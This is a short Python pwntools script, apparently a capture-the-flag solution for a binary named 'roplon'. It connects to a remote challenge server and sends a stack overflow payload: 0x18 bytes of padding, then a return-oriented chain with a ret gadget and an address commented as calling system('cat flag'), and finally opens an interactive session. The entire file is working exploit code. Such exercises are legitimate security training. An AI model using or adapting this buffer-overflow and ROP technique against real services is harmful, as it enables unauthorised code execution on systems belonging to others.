#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"
epath = "./roplon"
#r = process(epath)
r = remote("184.72.87.9", 8007)
e = ELF(epath)

pad = b"\x00"*0x18
for i in range(4):
    r.recvline()
#pause()
r.sendline(flat(pad,
                e.sym.cat_flag,
                0x4012d9, # ret
                0x4012c2)) # system("cat flag")


r.interactive()
r.close()
